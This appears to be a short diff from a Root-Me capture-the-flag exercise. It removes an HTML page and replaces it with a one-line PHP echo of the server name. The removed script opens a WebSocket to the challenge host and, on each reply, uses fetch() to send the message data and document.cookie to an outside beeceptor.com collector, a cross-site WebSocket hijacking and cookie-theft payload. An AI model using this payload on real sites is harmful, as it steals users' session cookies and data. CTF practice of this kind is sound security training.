@@ -1,13 +1,3 @@
-<h1>Hello</h1>
-<script>
-  websocket = new WebSocket('ws://ctf11.root-me.org/ws');
-  websocket.onopen = start;
-  websocket.onmessage = handleReply;
-  
-  function start(event) {  
-    websocket.send("READY");
-  }
-  function handleReply(event) {  
-    fetch('https://rootme.free.beeceptor.com/'+event.data+document.cookie, {mode: 'no-cors'})
-  }
-</script>
+<?php
+echo '<?php echo $_SERVER["SERVER_NAME"]; ?>';
+?>
